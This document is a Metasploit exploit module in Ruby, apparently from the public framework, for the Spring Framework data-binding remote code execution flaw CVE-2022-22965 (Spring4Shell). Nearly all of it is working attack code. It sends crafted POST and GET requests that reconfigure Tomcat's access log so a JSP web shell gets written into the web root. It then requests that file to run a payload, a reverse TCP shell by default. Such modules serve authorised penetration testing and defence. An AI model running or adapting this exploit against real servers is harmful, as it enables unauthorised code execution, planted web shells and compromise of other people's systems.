##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  # include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Spring Framework RCE via Data Binding',
        'Description' => %q{
          A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE)
          via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the
          application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit.
          However, the nature of the vulnerability is more general, and there may be other ways to exploit it.
        },
        'Author' => [
          'helloexp', # vulnerability discovery
          'Heyder Andrade' # module
        ],
        'References' => [
          ['CVE', '2022-22965'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2022-22965']
        ],
        'DisclosureDate' => '2022-03-30',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_JAVA,
        'Privileged' => false,
        'Targets' => [
          ['Java Generic', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
        'Notes' => {
          'AKA' => [ 'SpringShell', 'Spring4Shell' ],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => "class.module.classLoader.DefaultAssertionStatus=#{Rex::Text.rand_text_alpha_lower(4..6)}"
    )
    # TODO - get tomcat version and test GET as well
    # if res && res.code == 400 && res.body.include?('Apache Tomcat')
    return CheckCode::Unknown unless res

    return CheckCode::Safe unless res.code == 400

    Exploit::CheckCode::Appears
  end

  def exploit

    reset_variables
    # Change the tomcat log location variables
    change_log formated_payload
    write_payload
    # reset_pattern
    register_files_for_cleanup(jsp_filename)
    execute_jsp_payload
    handler
  end

  def formated_payload
    # rubocop:disable  Style/FormatStringToken
    stub = payload.raw.gsub('<%', '%{prefix}i').gsub('%>', '%{suffix}i')
    # rubocop:enable  Style/FormatStringToken

    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=#{Rex::Text.uri_encode(stub)}"

    # filename = rand_text_alphanumeric(8..16)
    directory = 'webapps/ROOT'
    log_file_suffix = 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'
    log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=#{directory}"
    log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=#{jsp_filename.split('.').first}"
    log_file_date_format = 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

    [log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format].join('&')

  end

  def reset_variables
    vprint_status 'Resetting Log Variables'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.'
    )
  end

  def change_log(body_data)
    vprint_status 'Modifying Log Configurations'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => body_data
    )
    # Changes take some time to populate on tomcat
    sleep(3)
  end

  def write_payload
    vprint_status 'Send the packet that writes the web shell'
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'headers' => {
        'prefix' => '<%',
        'suffix' => '%>//',
        'c' => 'Runtime'
      }
    )
    sleep(1)
  end

  def reset_pattern
    vprint_status 'Reset the pattern to prevent future writes into the file'
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'data' => 'class.module.classLoader.resources.context.parent.pipeline.first.pattern='
    )
    sleep(5)
  end

  def execute_jsp_payload
    jsp_uri = normalize_uri(target_uri.path, jsp_filename)

    print_status('Executing JSP payload')
    vprint_status(full_uri(jsp_uri))

    sleep(5)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("/#{jsp_filename}")
    }, 5)
    fail_with(Failure::UnexpectedReply, "Seems the payload haven't been written") unless res.code.to_i == 200

  end

  def jsp_filename
    @jsp_filename ||= "#{rand_text_alphanumeric(8..16)}.jsp"
  end

end
